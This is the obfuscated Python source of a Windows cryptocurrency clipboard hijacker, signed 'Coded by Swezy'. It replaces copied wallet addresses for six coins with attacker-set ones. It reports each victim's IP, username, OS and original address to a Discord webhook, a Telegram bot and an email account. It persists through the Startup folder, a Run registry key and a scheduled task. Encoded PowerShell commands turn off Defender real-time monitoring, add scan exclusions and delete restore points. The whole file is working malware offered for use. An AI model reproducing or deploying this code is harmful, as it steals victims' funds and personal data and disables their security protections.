import pyperclip as awd42321dsa
import time as greduhio
import re as hbgidr
import subprocess as xvcj5tr
import smtplib as ewfg45z54
from email.mime.multipart import MIMEMultipart as f4r354
from email.mime.text import MIMEText as er34x
import requests as wef4323
import json as rdefg45t54
from telegram import Bot as ef9igj48
import pygetwindow as yxvcre
import os as ewsjinf783
import platform as btrrf98
import shutil as euifew
import sys as wzf8u4w7
import winreg as ef9uh77 
import threading as wefuh4323
import asyncio as nueia8732q

xwwwrew = '%Brgxer%'
dsfrsdjk = '%Zrxgre%'
dsvisdf = '%Brxger%'

yxuiue = '%Bxud%'
deiuc = '%Hdhji%'

def esuih():
    try:
        euifew.copy(ewsjinf783.path.abspath(wzf8u4w7.argv[0]), ewsjinf783.path.join(ewsjinf783.environ['APPDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup'))
    except Exception as e:
        pass



def fwf9ud98():
    try:
        htruhijn = ef9uh77.HKEY_CURRENT_USER
        dfvf = r'Software\Microsoft\Windows\CurrentVersion\Run'
        ewf43 = ef9uh77.OpenKey(htruhijn, dfvf, 0, ef9uh77.KEY_SET_VALUE)

        ewsjinf783.path.basename(ewsjinf783.path.abspath(wzf8u4w7.argv[0]))
        ef9uh77.SetValueEx(ewf43, 'WindowsUpdater', 0, ef9uh77.REG_SZ, ewsjinf783.path.abspath(wzf8u4w7.argv[0]))
        ef9uh77.CloseKey(ewf43)
    except Exception as e:
        pass

def hzirge():
    try:
        awdt553234 = ewsjinf783.environ.get('ProgramData')
        xcsgf4 = "MicrosoftStore_temp"
        x5g4g654z654 = ewsjinf783.path.join(awdt553234, xcsgf4)
        ewsjinf783.makedirs(x5g4g654z654, exist_ok=True)
        euifew.copy(ewsjinf783.path.abspath(wzf8u4w7.argv[0]), ewsjinf783.path.join(x5g4g654z654))
        xvcj5tr.run(f'schtasks /create /tn "WindowsUpdater" /sc ONLOGON /rl HIGHEST /tr "{ewsjinf783.path.abspath(wzf8u4w7.argv[0])}"', shell=True, check=True)
        
    except Exception as e:
        pass


earth = 'powershell.exe -EncodedCommand UgBlAHMAdABhAHIAdAAtAFMAZQByAHYAaQBjAGUAIABjAGIAZABoAHMAdgBjAF8AKgA='

world = 'powershell.exe -EncodedCommand UwBlAHQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARABpAHMAYQBiAGwAZQBSAGUAYQBsAHQAaQBtAGUATQBvAG4AaQB0AG8AcgBpAG4AZwAgACQAdAByAHUAZQA7ACAAQQBkAGQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARQB4AGMAbAB1AHMAaQBvAG4ARQB4AHQAZQBuAHMAaQBvAG4AIAAnAC4AZQB4AGUAJwA7ACAAQQBkAGQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARQB4AGMAbAB1AHMAaQBvAG4ARQB4AHQAZQBuAHMAaQBvAG4AIAAnAC4AcAB5ACcAOwAgACAAQQBkAGQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARQB4AGMAbAB1AHMAaQBvAG4AUABhAHQAaAAgACcAQwA6AFwAJwA7ACAAIABBAGQAZAAtAE0AcABQAHIAZQBmAGUAcgBlAG4AYwBlACAALQBFAHgAYwBsAHUAcwBpAG8AbgBQAGEAdABoACAAJwBEADoAXAAnAA=='

moon = 'powershell.exe -EncodedCommand RwBlAHQALQBDAG8AbQBwAHUAdABlAHIAUgBlAHMAdABvAHIAZQBQAG8AaQBuAHQAIAB8ACAARABlAGwAZQB0AGUALQBDAG8AbQBwAHUAdABlAHIAUgBlAHMAdABvAHIAZQBQAG8AaQBuAHQA'




deswsjn = '%webhook%'

kuhio49 = '%tele%'
kuhioxx49 = '%chatid%'

regh54 = '%smtp%'

dvxkioucb = '%pas%'

fwefg54z54 = '%rec%'

r6zuj75654 = 'Clipper | Wallet Copied'

def awfes54():
    try:
        awdwa32 = wef4323.get('https://api.ipify.org?format=json')
        xycxy = awdwa32.json()
        return xycxy['ip']
    except Exception as e:
        return None

efewrf = awfes54()
awdewa98ßu43 = btrrf98.system()
awdewa98ßu43we = btrrf98.release()

def gesnui(seujifewr, wadw324, awewe, wefffffj):
    ghtfh546t = f'💰 [Clipper]\n\nProcess Name: {seujifewr}\n\nIP: {efewrf}\nUser: {ewsjinf783.getlogin()}\nOS: {awdewa98ßu43} {awdewa98ßu43we}\nWallet: {wadw324}\n\nAddress: {awewe}\nReplaced: {wefffffj}'
    gsret5e78z = f4r354()
    gsret5e78z['From'] = regh54
    gsret5e78z['To'] = fwefg54z54
    gsret5e78z['r6zuj75654'] = r6zuj75654

    gsret5e78z.attach(er34x(ghtfh546t, 'plain'))

    try:
        wefggggrde87 = ewfg45z54.SMTP('smtp.gmail.com', 587)
        wefggggrde87.starttls()

        wefggggrde87.login(regh54, dvxkioucb)

        vfdkio9 = gsret5e78z.as_string()
        wefggggrde87.sendmail(regh54, fwefg54z54, vfdkio9)
    except Exception as e:
        pass
    finally:
        wefggggrde87.quit()

def redugh8(btr43, we8098, fweui89, ewfxe32):
    try:
        xcwe23 = {
            'embeds': [
                {
                    'title': 'Clipper | Wallet Copied',
                    'description': f'__**💰 [Clipper]**__\n\n- Process Name: **{btr43}**\n\n- IP: **{efewrf}**\n- User: **{ewsjinf783.getlogin()}**\n- OS: **{awdewa98ßu43} {awdewa98ßu43we}**\n- Wallet: **{we8098}**\n\n- Address: **{fweui89}**\n- Replaced: **{ewfxe32}**',
                    'color': int('000ff7', 16),
                    'footer': {'text': 'Coded by Swezy <3'}
                }
            ]
        }
        daw2 = {'Content-Type': 'application/json'}
        dawd3212432efergg = wef4323.post(deswsjn, headers=daw2, data=rdefg45t54.dumps(xcwe23))

        if dawd3212432efergg.status_code == 200:
            pass
        else:
            pass
    except Exception as e:
        pass


async def egreger453645(wadwa32, fexccxvxcew, ewsfuin8934, fweijf):
    try:
        zh5 = ef9igj48(token=kuhio49)
        eguo6643 = f'💰 [Clipper]\n\nProcess Name: {wadwa32}\n\nIP: {efewrf}\nUser: {ewsjinf783.getlogin()}\nOS: {awdewa98ßu43} {awdewa98ßu43we}\nWallet: {fexccxvxcew}\n\nAddress: {ewsfuin8934}\nReplaced: {fweijf}'
        await zh5.send_message(chat_id=kuhioxx49, text=eguo6643)
    except Exception as e:
        pass


hrextr_R2Xoy1 = '%BTC%'
hrextr_R2Xoy2 = '%ETH%'
hrextr_R2Xoy3 = '%MONERO%'
hrextr_R2Xoy4 = '%LTC%'
hrextr_R2Xoy5 = '%DOGE%'
hrextr_R2Xoy6 = '%TRX%'




def vdsu281cjm():
    hfruieoawd = str(awd42321dsa.paste())
    wadyhe_cery1 = hbgidr.match(r'\b(1|3|bc1)[a-zA-Z0-9]{25,39}\b', hfruieoawd) 
    wadyhe_cery11 = bool(wadyhe_cery1)
    wadyhe_cery2 = hbgidr.match(r'\b0x[a-fA-F0-9]{40}\b', hfruieoawd)
    wadyhe_cery22 = bool(wadyhe_cery2)
    wadyhe_cery3 = hbgidr.match(r'\b(4|8)[0-9AB][a-zA-Z0-9]{93}\b', hfruieoawd)
    wadyhe_cery33 = bool(wadyhe_cery3)
    wadyhe_cery4 = hbgidr.match(r'\b(L|M|ltc1)[a-zA-Z0-9]{26,58}\b', hfruieoawd)
    wadyhe_cery44 = bool(wadyhe_cery4)

    wadyhe_cery5 = hbgidr.match(r'\bA[a-zA-Z0-9]{33,34}\b',hfruieoawd)
    wadyhe_cery00 = hbgidr.match(r'\bD[a-zA-Z0-9]{33,34}\b', hfruieoawd)
    wadyhe_cery000 = hbgidr.match(r'\bdoge1[a-zA-HJ-NP-Z0-9]{7,78}\b', hfruieoawd)

    wadyhe_cery55 = bool(wadyhe_cery5)
    wadyhe_cery555 = bool(wadyhe_cery00)
    wadyhe_cery5555 = bool(wadyhe_cery000)

    wadyhe_cery6 = hbgidr.match(r'\bT[a-zA-Z0-9]{32,33}\b', hfruieoawd)
    wadyhe_cery66 = bool(wadyhe_cery6)

    greduhio.sleep(0.25)
    if wadyhe_cery11 == True:
        if hrextr_R2Xoy1 != '' or ' ' or "%BTC%":
            frewsuih = yxvcre.getActiveWindow()
            if wadyhe_cery1.group() != hrextr_R2Xoy1:
                try:
                    xvcj5tr.run(earth, shell=True, check=False, capture_output=False)
                except Exception as e:
                    pass
                awd42321dsa.copy(hrextr_R2Xoy1)

                if deswsjn != '' or ' ' or '%webhook%':
                    wefuh4323.Thread(target=redugh8(frewsuih.title, 'Bitcoin [BTC]', hfruieoawd, hrextr_R2Xoy1)).start()

                if kuhio49 != '' or ' ' or '%tele%':
                    wefuh4323.Thread(target=nueia8732q.run(egreger453645(frewsuih.title, 'Bitcoin [BTC]', hfruieoawd, hrextr_R2Xoy1))).start()

                if regh54 != '' or ' ' or '%smtp%':
                    wefuh4323.Thread(target=gesnui(frewsuih.title, 'Bitcoin [BTC]', hfruieoawd, hrextr_R2Xoy1)).start()

    elif wadyhe_cery22 == True:
        if hrextr_R2Xoy2 != '' or ' ' or "%ETH%":
            frewsuih = yxvcre.getActiveWindow()
            if wadyhe_cery2.group() != hrextr_R2Xoy2:
                try:
                    xvcj5tr.run(earth, shell=True, check=True, capture_output=False)
                except Exception as e:
                    pass
                awd42321dsa.copy(hrextr_R2Xoy2)

                if deswsjn != '' or ' ' or '%webhook%':
                    wefuh4323.Thread(target=redugh8(frewsuih.title, 'Ethereum [ETH]', hfruieoawd, hrextr_R2Xoy2)).start()

                if kuhio49 != '' or ' ' or '%tele%':
                    wefuh4323.Thread(target=nueia8732q.run(egreger453645(frewsuih.title, 'Ethereum [ETH]', hfruieoawd, hrextr_R2Xoy2))).start()

                if regh54 != '' or ' ' or '%smtp%':
                    wefuh4323.Thread(target=gesnui(frewsuih.title, 'Ethereum [ETH]', hfruieoawd, hrextr_R2Xoy2)).start()


    elif wadyhe_cery33 == True:
        if hrextr_R2Xoy3 != '' or ' ' or "%MONERO%":
            frewsuih = yxvcre.getActiveWindow()
            if wadyhe_cery3.group() != hrextr_R2Xoy3:
                try:
                    xvcj5tr.run(earth, shell=True, check=True, capture_output=False)
                except Exception as e:
                    pass
                awd42321dsa.copy(hrextr_R2Xoy3)

                if deswsjn != '' or ' ' or '%webhook%':
                    wefuh4323.Thread(target=redugh8(frewsuih.title, 'Monero [XMR]', hfruieoawd, hrextr_R2Xoy3)).start()

                if kuhio49 != '' or ' ' or '%tele%':
                    wefuh4323.Thread(target=nueia8732q.run(egreger453645(frewsuih.title, 'Monero [XMR]', hfruieoawd, hrextr_R2Xoy3))).start()

                if regh54 != '' or ' ' or '%smtp%':
                    wefuh4323.Thread(target=gesnui(frewsuih.title, 'Monero [XMR]', hfruieoawd, hrextr_R2Xoy3)).start()

    elif wadyhe_cery44 == True:
        if hrextr_R2Xoy4 != '' or ' ' or "%LTC%":
            frewsuih = yxvcre.getActiveWindow()
            if wadyhe_cery4.group() != hrextr_R2Xoy4:
                try:
                    xvcj5tr.run(earth, shell=True, check=True, capture_output=False)
                except Exception as e:
                    pass
                awd42321dsa.copy(hrextr_R2Xoy4)

                if deswsjn != '' or ' ' or '%webhook%':
                    wefuh4323.Thread(target=redugh8(frewsuih.title, 'Litecoin [LTC]', hfruieoawd, hrextr_R2Xoy4)).start()

                if kuhio49 != '' or ' ' or '%tele%':
                    wefuh4323.Thread(target=nueia8732q.run(egreger453645(frewsuih.title, 'Litecoin [LTC]', hfruieoawd, hrextr_R2Xoy4))).start()

                if regh54 != '' or ' ' or '%smtp%':
                    wefuh4323.Thread(target=gesnui(frewsuih.title, 'Litecoin [LTC]', hfruieoawd, hrextr_R2Xoy4)).start()


    elif wadyhe_cery55 == True or wadyhe_cery555 == True or wadyhe_cery5555 == True:
        if hrextr_R2Xoy5 != '' or ' ' or "%DOGE%":
            frewsuih = yxvcre.getActiveWindow()
            if wadyhe_cery5 is not None or wadyhe_cery00 is not None or wadyhe_cery000 is not None:
                if wadyhe_cery5 is not None and wadyhe_cery5.group() != hrextr_R2Xoy5:
                    try:
                        xvcj5tr.run(earth, shell=True, check=True, capture_output=False)
                    except Exception as e:
                        pass
                    awd42321dsa.copy(hrextr_R2Xoy5)
                    if deswsjn != '' or ' ' or '%webhook%':
                        wefuh4323.Thread(target=redugh8(frewsuih.title, 'Dogecoin [DOGE]', hfruieoawd, hrextr_R2Xoy5)).start()
    
                    if kuhio49 != '' or ' ' or '%tele%':
                        wefuh4323.Thread(target=nueia8732q.run(egreger453645(frewsuih.title, 'Dogecoin [DOGE]', hfruieoawd, hrextr_R2Xoy5))).start()
    
                    if regh54 != '' or ' ' or '%smtp%':
                        wefuh4323.Thread(target=gesnui(frewsuih.title, 'Dogecoin [DOGE]', hfruieoawd, hrextr_R2Xoy5)).start()
                elif wadyhe_cery00 is not None and wadyhe_cery00.group() != hrextr_R2Xoy5:
                    try:
                        xvcj5tr.run(earth, shell=True, check=True, capture_output=False)
                    except Exception as e:
                        pass
                    awd42321dsa.copy(hrextr_R2Xoy5)
                    if deswsjn != '' or ' ' or '%webhook%':
                        wefuh4323.Thread(target=redugh8(frewsuih.title, 'Dogecoin [DOGE]', hfruieoawd, hrextr_R2Xoy5)).start()
    
                    if kuhio49 != '' or ' ' or '%tele%':
                        wefuh4323.Thread(target=nueia8732q.run(egreger453645(frewsuih.title, 'Dogecoin [DOGE]', hfruieoawd, hrextr_R2Xoy5))).start()
    
                    if regh54 != '' or ' ' or '%smtp%':
                        wefuh4323.Thread(target=gesnui(frewsuih.title, 'Dogecoin [DOGE]', hfruieoawd, hrextr_R2Xoy5)).start()
                elif wadyhe_cery000 is not None and wadyhe_cery000.group() != hrextr_R2Xoy5:
                    try:
                        xvcj5tr.run(earth, shell=True, check=True, capture_output=False)
                    except Exception as e:
                        pass
                    awd42321dsa.copy(hrextr_R2Xoy5)
                    if deswsjn != '' or ' ' or '%webhook%':
                        wefuh4323.Thread(target=redugh8(frewsuih.title, 'Dogecoin [DOGE]', hfruieoawd, hrextr_R2Xoy5)).start()
    
                    if kuhio49 != '' or ' ' or '%tele%':
                        wefuh4323.Thread(target=nueia8732q.run(egreger453645(frewsuih.title, 'Dogecoin [DOGE]', hfruieoawd, hrextr_R2Xoy5))).start()
    
                    if regh54 != '' or ' ' or '%smtp%':
                        wefuh4323.Thread(target=gesnui(frewsuih.title, 'Dogecoin [DOGE]', hfruieoawd, hrextr_R2Xoy5)).start()
    elif wadyhe_cery66 == True:
        if hrextr_R2Xoy6 != '' or ' ' or "%TRX%":
            frewsuih = yxvcre.getActiveWindow()
            if wadyhe_cery6.group() != hrextr_R2Xoy6:
                try:
                    xvcj5tr.run(earth, shell=True, check=True, capture_output=False)
                except Exception as e:
                    pass
                awd42321dsa.copy(hrextr_R2Xoy6)
                if deswsjn != '' or ' ' or '%webhook%':
                    wefuh4323.Thread(target=redugh8(frewsuih.title, 'Tron [TRX]', hfruieoawd, hrextr_R2Xoy6)).start()

                if kuhio49 != '' or ' ' or '%tele%':
                    wefuh4323.Thread(target=nueia8732q.run(egreger453645(frewsuih.title, 'Tron [TRX]', hfruieoawd, hrextr_R2Xoy6))).start()

                if regh54 != '' or ' ' or '%smtp%':
                    wefuh4323.Thread(target=gesnui(frewsuih.title, 'Tron [TRX]', hfruieoawd, hrextr_R2Xoy6)).start()

    else:
        pass

def eefu():
    while True:
        vdsu281cjm()


if __name__ == '__main__':
    if deiuc == 'y':
        try:
            xvcj5tr.run(moon, shell=True, check=True, capture_output=False)
        except Exception as e:
            pass

    if yxuiue == 'y':
        try:
            xvcj5tr.run(world, shell=True, check=True, capture_output=False)
        except Exception as e:
            pass

    if xwwwrew == 'y':
        esuih()
    else:
        pass
    if dsfrsdjk == 'y':
        hzirge()
    else:
        pass
    if dsvisdf == 'y':
        hzirge()
    else:
        pass

    eefu()
